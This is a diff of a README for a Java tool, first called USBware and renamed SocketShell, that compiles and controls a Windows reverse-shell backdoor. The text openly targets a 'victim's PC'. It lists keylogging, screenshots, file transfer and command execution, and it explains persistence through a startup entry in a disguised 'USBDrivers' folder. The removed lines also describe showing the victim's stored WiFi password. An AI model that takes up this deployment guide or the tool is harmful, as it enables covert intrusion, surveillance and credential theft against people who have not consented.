@@ -1,8 +1,10 @@
-# USBware
-USBware is a program can convert a USB drive into a tool that installs/runs a reverse shell backdoor on a victim's Windows PC, as well as control and send commands to this backdoor.
+# SocketShell
+Typically, reverse shell utilities such as Netcat have 2 main functions, to pipe remote input into cmd or bash, and output the response.
+This is useful, but it is also limited.
+SocketShell overcomes these limitations by including the ability to inject keystrokes, get screenshots, transfer files, and many other tasks.
 
 ## Features
-USBware converts a USB drive into a backdoor or backdoor installation tool. 
+SocketShell is a backdoor compiling and controlling tool.
 
 This backdoor can:
 - Run Command Prompt commands
@@ -14,55 +16,54 @@ This backdoor can:
 - Start a KeyLogger
 - Get a screenshot of victim's computer
 
-This backdoor is created through server-client socket connections, with your computer acting as the server, and your victim's computer acting as a client.
+To compile the backdoor, SocketShell:
+- Writes and encrypts your private IP address to 'ip.txt' in directory 'backdoor'.
+- Copies the necessary jar files to 'backdoor'.
+- If desired, copies a Java Runtime Environment to 'backdoor'.
+- Creates batch files in 'backdoor' for running the jar files in a packaged Java Runtime Environment.
+- Copies all '.duck' DuckyScripts and '.ps1' PowerShell scripts to 'backdoor'.
 
-To convert a USB drive into a backdoor or backdoor installation tool, USBware:
-- Writes and encrypts your private IP address to 'ip.txt' on the USB drive. This is needed for the victim's computer, the client, to connect to your computer, the server.
-- Either the backdoor and/or backdoor installation jar file(s) is/are copied to the USB drive.
-- If desired, a Java Runtime Environment is copied to the USB drive. 
-- A batch file 'run.bat' is created on the USB drive for running the jar file(s) in a packaged Java Runtime Environment.
-- All '.duck' DuckyScripts and '.ps1' PowerShell scripts are copied to the USB drive.
+To start the backdoor on a victim PC, transfer all files from the directory 'backdoor' onto a victim PC and execute either run.bat or install.bat.
 
-After conversion, the USB drive should be inserted into a victim's PC and 'run.bat' should be executed. This will:
-- Display a message with the vitim's current WiFi connection along with the password (if available).
-- Either run or install the backdoor.
-  - If the backdoor is set to install, 'run.bat' will:
-    - Install all necessary backdoor files to 'C:\ProgramData\USBDrivers'.
-    - Add backdoor to startup.
-    - Start the backdoor.
-  - If the backdoor is set to run, 'run.bat' will:
-    - Start the backdoor.
+run.bat will:
+- Start the backdoor
+- Display information for controlling the backdoor
 
-Once running, to control the backdoor you must return to USBware and run option 1 at start while being connecting to the same WiFi network as the victim's computer.
+install.bat will:
+- Install the backdoor to 'C:\ProgramData\USBDrivers'
+- Add the backdoor to startup (if executed as administrator)
+- Run the backdoor
+- Display information for controlling the backdoor
+
+Once running, to control the backdoor you must return to SocketShell and run option 1 at start while connected to the same WiFi network as the victim's computer.
 
 ## Requirements
 - A Java JDK distribution must be installed and added to PATH.
 - Maven must be installed and added to PATH.
-- You must use the same computer to convert the USB drive and control the backdoor.
-  - The computer used to convert the USB drive must be on the same WiFi network as the victim's computer.
-  - The IPv4 address of this computer must remain static in the time between converting the USB drive and controlling the backdoor.
+- You must use the same computer to compile and control the backdoor.
+  - The computer used to compile the backdoor must be on the same WiFi network as the victim's computer.
+  - The IPv4 address of this computer must remain static in the time between compiling the backdoor and controlling it.
 - The computer used to control the backdoor must have their firewall deactivated.
-- If 'run.bat' is set to install the backdoor, it must be run as administrator to add the backdoor to startup.
 
 ## Compatibility
-USBware is compatible with Windows and Linux, while the backdoor is only compatible with Windows.
+SocketShell is compatible with Windows and Linux, while the backdoor is only compatible with Windows.
 
 ## Installation
 ```
-# clone USBware
-git clone https://github.com/ThatcherDev/USBware.git
+# clone SocketShell
+git clone https://github.com/ThatcherDev/SocketShell.git
 
-# change the working directory to USBware 
-cd USBware
+# change the working directory to SocketShell
+cd SocketShell
 
-# build USBware with Maven
+# build SocketShell with Maven
 mvn clean package
 ```
 
 ## Usage
 ```
-# run USBware
-java -jar usbware.jar
+# run SocketShell
+java -jar socketshell.jar
 ```
 
 ## License
